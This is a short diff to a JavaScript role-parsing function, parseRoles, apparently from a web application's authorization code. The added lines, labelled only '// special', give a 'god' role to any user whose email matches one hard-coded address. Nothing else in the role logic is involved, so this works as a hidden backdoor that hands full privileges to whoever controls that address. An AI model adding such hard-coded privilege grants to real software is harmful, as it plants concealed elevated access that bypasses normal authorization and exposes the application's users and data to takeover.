@@ -126,6 +126,10 @@ const parseRoles = (user) => {
       return false;
     });
   }
+  // special
+  if (user.email === 'elivoa@gmail.com') {
+    roles.god = true;
+  }
   return roles;
 };
 
